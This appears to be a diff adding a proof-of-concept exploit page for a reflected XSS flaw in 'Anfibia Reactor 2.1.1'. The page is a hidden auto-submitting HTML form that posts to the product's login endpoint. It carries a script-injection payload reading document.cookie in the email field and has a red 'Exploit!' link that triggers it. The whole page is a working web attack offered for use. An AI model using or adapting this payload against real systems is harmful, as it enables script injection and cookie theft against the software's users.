@@ -1,0 +1,14 @@
+<html>
+<title>Anfibia Reactor 2.1.1 Remote XSS POST Injection Vulnerability</title>
+<body bgcolor="#1C1C1C">
+<script type="text/javascript">function xss1(){document.forms["xss"].submit();}</script>
+<form action="http://10.0.0.17:2188/reactor/login.do" enctype="application/x-www-form-urlencoded" method="POST" id="xss">
+<input type="hidden" name="token" id="token" value="" />
+<input type="hidden" name="passwdhash" id="passwdhash" />
+<input type="hidden" name="email" id="email" value='"><script>alert(document.cookie)</script>' />
+<input type="hidden" name="password" id="password" />
+</form>
+<a href="javascript: xss1();" style="text-decoration:none">
+<b><font color="red"><center><h3><br /><br />Exploit!<h3></center></font></b></a>
+</body>
+</html>
